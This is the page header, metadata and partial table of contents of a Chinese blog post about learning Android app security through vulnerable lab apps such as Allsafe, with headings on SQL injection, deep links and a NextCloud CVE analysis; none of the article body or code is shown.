<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="最近学完了《第一行代码：Android》和《Android应用安全实战：Frida协议分析》，算是简单了解了Android开发和基本的逆向分析、Hook等。但对于Android应用安全，App漏洞挖掘方面的学习还是有点迷茫，比起大量的理论知识，个人还是喜欢直接动手实践，所以收集了很多Android应用漏洞靶场，边实践边补足Android安全相关的知识和技能。这些靶场其实也有公开WriteUp，不过">
<meta property="og:type" content="article">
<meta property="og:title" content="通过漏洞靶场学习Android应用安全">
<meta property="og:url" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/index.html">
<meta property="og:site_name" content="l3yx&#39;s blog">
<meta property="og:description" content="最近学完了《第一行代码：Android》和《Android应用安全实战：Frida协议分析》，算是简单了解了Android开发和基本的逆向分析、Hook等。但对于Android应用安全，App漏洞挖掘方面的学习还是有点迷茫，比起大量的理论知识，个人还是喜欢直接动手实践，所以收集了很多Android应用漏洞靶场，边实践边补足Android安全相关的知识和技能。这些靶场其实也有公开WriteUp，不过">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241218214319861.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241218212521659.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219115704433.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219095640335.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219102625222.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219111435952.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219112202930.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219112311905.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219152552805.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219152401039.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219153018462.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219154054590.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219155708363.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219155907805.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219160152217.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219160502458.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219164959652.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219170814612.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219171545384.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219174013159.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219201100021.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/content-provider-overview.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219230857489.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219230954846.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219231741942.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219231830945.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219233550461.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219235751590.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220002308647.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220002431870.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220131919496.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220131957863.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220132051218.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220140920524.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221112630553.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221112732067.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221113152339.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221162014262.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221162616770.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221164633354.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221224258077.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222100538859.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222102240927.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222144938369.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222155344298.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222155258502.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/service_lifecycle.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223172534925.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223175415785.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234501192.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234900620.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234104101.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234211993.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224100508805.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224125502502.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224125840520.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224134154868.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224135340940.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224135857602.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224151254988.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/android-stack.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224213059960.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224213911935.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224214046580.png">
<meta property="og:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/whiteboard_exported_image.png">
<meta property="article:published_time" content="2024-12-18T12:39:58.000Z">
<meta property="article:modified_time" content="2024-12-26T05:26:00.000Z">
<meta property="article:author" content="淚笑">
<meta property="article:tag" content="移动安全">
<meta property="article:tag" content="Android">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241218214319861.png">


<link rel="canonical" href="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/","path":"2024/12/18/通过漏洞靶场学习Android应用安全/","title":"通过漏洞靶场学习Android应用安全"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>通过漏洞靶场学习Android应用安全 | l3yx's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">l3yx's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Allsafe"><span class="nav-number">2.</span> <span class="nav-text">Allsafe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Logging"><span class="nav-number">2.1.</span> <span class="nav-text">Insecure Logging</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hardcoded-Credentials"><span class="nav-number">2.2.</span> <span class="nav-text">Hardcoded Credentials</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Firebase-Database"><span class="nav-number">2.3.</span> <span class="nav-text">Firebase Database</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Firebase-Realtime-Database%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.3.1.</span> <span class="nav-text">Firebase Realtime Database介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Firebase-Realtime-Database%E4%BD%BF%E7%94%A8%E9%A3%8E%E9%99%A9"><span class="nav-number">2.3.2.</span> <span class="nav-text">Firebase Realtime Database使用风险</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Shared-Preferences"><span class="nav-number">2.4.</span> <span class="nav-text">Insecure Shared Preferences</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SharedPreferences%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.4.1.</span> <span class="nav-text">SharedPreferences介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SharedPreferences%E9%A3%8E%E9%99%A9"><span class="nav-number">2.4.2.</span> <span class="nav-text">SharedPreferences风险</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Injection"><span class="nav-number">2.5.</span> <span class="nav-text">SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.5.1.</span> <span class="nav-text">靶场漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NextCloud-Android-App-Content-Provider-SQL%E6%B3%A8%E5%85%A5-CVE-2019-5454-%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.2.</span> <span class="nav-text">NextCloud Android App Content Provider SQL注入(CVE-2019-5454)分析与修复绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Drozer%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">2.5.2.1.</span> <span class="nav-text">Drozer基本使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Content-Provider%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.5.2.2.</span> <span class="nav-text">Content Provider介绍</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.2.3.</span> <span class="nav-text">漏洞分析与修复绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIN-Bypass"><span class="nav-number">2.6.</span> <span class="nav-text">PIN Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Root-Detection"><span class="nav-number">2.7.</span> <span class="nav-text">Root Detection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deep-Link-Exploitation"><span class="nav-number">2.8.</span> <span class="nav-text">Deep Link Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Deep-Link%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.8.1.</span> <span class="nav-text">Deep Link介绍</span></a></li><li class="nav-item 